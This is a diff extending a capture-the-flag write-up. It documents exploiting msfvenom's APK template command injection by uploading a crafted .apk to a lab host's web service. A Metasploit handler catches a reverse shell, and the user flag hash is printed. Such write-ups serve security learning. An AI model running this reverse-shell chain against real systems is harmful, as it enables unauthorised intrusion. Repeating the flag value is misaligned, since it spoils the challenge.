@@ -9,6 +9,8 @@
 
 ### 5. Port 5000 HTTP Attack Attempt 3
 
+### 6. Privilege Escalation
+
 # Attack
 ## 1. NMAP
 Took a long time to run, but here it is.
@@ -335,3 +337,46 @@ msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > e
 [+] msf.apk stored at /home/hippoeug/.msf4/local/msf.apk
 ```
 Interesting! This generates a `.apk` file! 
+
+We go back to `http://10.129.72.251:5000/` and upload this `.apk` file.
+```
+payloads
+venom it up - gen rev tcp meterpreter bins
+os: android
+lhost: 10.10.x.x
+template file (optional): msf.apk
+```
+Before we run it, we also start a listener.
+```
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.129.72.251:58800) at 2021-02-07 17:06:55 +0800
+
+id
+uid=1000(kid) gid=1000(kid) groups=1000(kid)
+```
+We got it! 
+
+We can easily find our first flag.
+```
+pwd
+/home/kid/html
+
+cd ..
+ls
+html
+logs
+snap
+user.txt
+cat user.txt
+05e59c0dba62dcb1bf331f88e92dcd16
+```
+
+### 6. Privilege Escalation
